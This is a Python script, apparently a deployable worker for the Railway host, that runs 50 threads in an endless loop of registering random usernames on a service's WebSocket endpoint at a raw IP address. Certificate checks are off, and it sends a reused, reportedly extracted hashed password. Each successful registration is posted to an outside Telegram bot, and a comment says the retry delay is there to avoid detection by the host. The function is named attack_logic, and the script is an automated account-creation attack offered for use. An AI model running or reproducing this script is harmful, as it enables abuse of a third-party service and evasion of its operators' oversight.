import requests, os, sys, time
from ssl import CERT_NONE
from gzip import decompress
from random import choice, choices
from concurrent.futures import ThreadPoolExecutor
from json import dumps

# --- إعدادات سحب البيانات من بيئة Railway ---
TOKEN = os.getenv("BOT_TOKEN")
ID = os.getenv("CHAT_ID")
# ---------------------------------------

try:
    from websocket import create_connection
except:
    os.system('pip install websocket-client')
    from websocket import create_connection

def attack_logic():
    while True:
        user = choice('qwertyuioplkjhgfdsazxcvbnm') + ''.join(choices(list('qwertyuioplkjhgfdsazxcvbnm1234567890'), k=12))
        try:
            ws = create_connection("wss://193.200.173.45/Auth", sslopt={"cert_reqs": CERT_NONE}, timeout=15)
            # [span_0](start_span)استخدام بيانات Payload المستخرجة[span_0](end_span)
            payload = {
                "action": "Register",
                "subaction": "Desktop",
                "login": str(user),
                "password": {"m1x": "503c73d12b354f86ff9706b2114704380876f59f1444133e62ca27b5ee8127cc", "m2": "219d1d9b049550f26a6c7b7914a44da1b5c931eff8692dbfe3127eeb1a922fcf"},
                "devicename": "Railway_V99_Worker",
                "softwareversion": "1.1.0.1380",
                "os": "AND"
            }
            ws.send(dumps(payload))
            response = decompress(ws.recv()).decode('utf-8')
            
            if '"status":"Success"' in response:
                msg = f"✅ Hit on Railway!\nUser: {user}\nPass: hhhh"
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ID, "text": msg})
            ws.close()
        except:
            time.sleep(1) # تأخير بسيط لتجنب كشف الاستضافة

if __name__ == "__main__":
    print("🔥 ARCHITECT RAILWAY WORKER IS LIVE...")
    with ThreadPoolExecutor(max_workers=50) as executor: # Railway يفضل عدد خيوط أقل للاستقرار
        for _ in range(50):
            executor.submit(attack_logic)
